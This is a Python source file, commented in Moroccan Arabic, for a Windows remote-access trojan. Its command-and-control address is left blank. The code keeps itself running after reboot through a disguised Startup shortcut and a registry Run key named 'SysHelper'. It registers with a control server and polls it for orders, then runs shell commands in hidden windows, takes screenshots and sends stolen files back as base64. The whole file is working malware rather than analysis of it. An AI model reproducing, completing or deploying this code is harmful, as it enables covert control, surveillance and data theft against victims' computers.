import requests
import os
import time
import socket
import platform
import subprocess
import base64
import sys
import shutil
C2_URL = ""
BOT_ID = socket.gethostname() + "_" + os.getenv('USERNAME', 'user')
current_directory = os.getcwd()
VERSION = "2.0"
def install_persistence():
    """يضيف نفسه لـ Startup و Registry باش يبقى شغال بعد Rebooter"""
    try:
        # المسار ديالنا الحالي
        script_path = os.path.abspath(sys.argv[0])
        
        # الطريقة الأولى: نضعو فـ Startup Folder (كل المستخدمين)
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                      'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_script = os.path.join(startup_folder, 'syshelper.lnk')
        
        # إذا مازال ماموجودش فـ Startup، نخلقو اختصار (Symlink)
        if not os.path.exists(startup_script):
            # نستعملو VBScript باش يخلق اختصار حقيقي (لأن Python صعيب)
            vbs_code = f'''
Set WshShell = CreateObject("WScript.Shell")
Set shortcut = WshShell.CreateShortcut("{startup_script}")
shortcut.TargetPath = "{script_path}"
shortcut.WorkingDirectory = "{os.path.dirname(script_path)}"
shortcut.Save
'''
            with open("tmp_startup.vbs", "w") as f:
                f.write(vbs_code)
            os.system("cscript tmp_startup.vbs")
            os.remove("tmp_startup.vbs")
            print("[+] Persistence installed (Startup).")
        
        # الطريقة الثانية: Registry Run Key (تشتغل مباشرة مع كل تسجيل دخول)
        # نستعملو PowerShell باش نضيفوها
        reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysHelper /t REG_SZ /d "{script_path}" /f'
        os.system(reg_cmd)
        print("[+] Persistence installed (Registry).")
        
        return True
    except Exception as e:
        print(f"[-] Persistence error: {e}")
        return False

# ========== 2. دالة أخذ لقطة شاشة ==========
def take_screenshot():
    """يصور الشاشة و يرجعها كـ Base64"""
    try:
        from PIL import ImageGrab
        import io
        
        # نصورو الشاشة
        screenshot = ImageGrab.grab()
        
        # نحولو لـ bytes فـ الذاكرة (ماشي عالديسك)
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes = img_bytes.getvalue()
        
        # نحولو لـ Base64 باش نبعته فـ نص عادي
        encoded = base64.b64encode(img_bytes).decode('utf-8')
        return encoded
    except ImportError:
        return "[ERROR] Pillow not installed. Run: pip install pillow"
    except Exception as e:
        return f"[ERROR] Screenshot failed: {e}"

# ========== 3. دالة تحميل ملف (Download = EXFILTRATION) ==========
def download_file(filepath):
    """يقرا أي ملف و يرجعو كـ Base64"""
    try:
        if not os.path.exists(filepath):
            return f"[ERROR] File not found: {filepath}"
        
        # نقراو الملف فـ وضع Binary
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # نحولو لـ Base64
        encoded = base64.b64encode(data).decode('utf-8')
        return f"[FILE] {filepath} ({len(data)} bytes)\n" + encoded
    except Exception as e:
        return f"[ERROR] Cannot read file: {e}"

# ========== 4. التنفيذ المخفي (Hide CMD Window) ==========
def run_hidden_command(cmd, cwd=None):
    """ينفذ أمر من غير ما يبان نافذة سوداء (كيستعمل فـ الأوامر العادية)"""
    CREATE_NO_WINDOW = 0x08000000  # خاصية ويندوز باش يخفي النافذة
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=cwd or current_directory,
        creationflags=CREATE_NO_WINDOW  # <--- هنا السحر
    )
    out, err = process.communicate(timeout=30)
    return out + err

# ========== بداية البرنامج ==========
print(f"[+] Agent v{VERSION} started. ID: {BOT_ID}")

# نركبو الثبات (مرة وحدة)
install_persistence()

# نسجلوا راسنا فـ السيرڤر
try:
    requests.post(f"{C2_URL}/register", json={
        "id": BOT_ID,
        "os": platform.system()
    }, timeout=3)
    print("[+] Registered to C2.")
except:
    pass

# ========== الحلقة الرئيسية (كل 2 ثانية) ==========
while True:
    try:
        # نسأل السيرڤر على الأوامر
        resp = requests.get(f"{C2_URL}/get_task", params={"id": BOT_ID}, timeout=5)
        
        if resp.status_code == 200:
            cmd = resp.json().get("command", "")
            
            if cmd:
                output = ""
                
                # ===== الأوامر الخاصة =====
                if cmd.lower().startswith("cd "):
                    # تغيير المسار
                    try:
                        new_path = cmd[3:].strip()
                        if not new_path:
                            new_path = os.path.expanduser("~")
                        os.chdir(new_path)
                        current_directory = os.getcwd()
                        output = f"[CWD] {current_directory}"
                    except Exception as e:
                        output = f"Error: {e}"
                
                elif cmd.lower() == "screenshot":
                    # أمر سريع باش نصورو الشاشة
                    output = take_screenshot()
                
                elif cmd.lower().startswith("download "):
                    # أمر باش نسرقو ملف (مثال: download C:\secret.txt)
                    file_path = cmd[9:].strip()
                    output = download_file(file_path)
                
                elif cmd.lower() == "persist":
                    # نعيد تثبيت الثبات (باش نتأكد)
                    if install_persistence():
                        output = "[PERSIST] Done."
                    else:
                        output = "[PERSIST] Failed."
                
                else:
                    # ===== الأمر العادي (Shell) =====
                    # نستعملو الدالة المخفية باش مايبانش CMD
                    output = run_hidden_command(cmd)
                    if not output.strip():
                        output = "[EXEC] Done."
                
                # نرجعالو النتيجة + المسار الحالي
                requests.post(f"{C2_URL}/send_result", json={
                    "id": BOT_ID,
                    "output": output,
                    "cwd": current_directory
                }, timeout=3)
                
    except Exception as e:
                       
        pass

    time.sleep(2)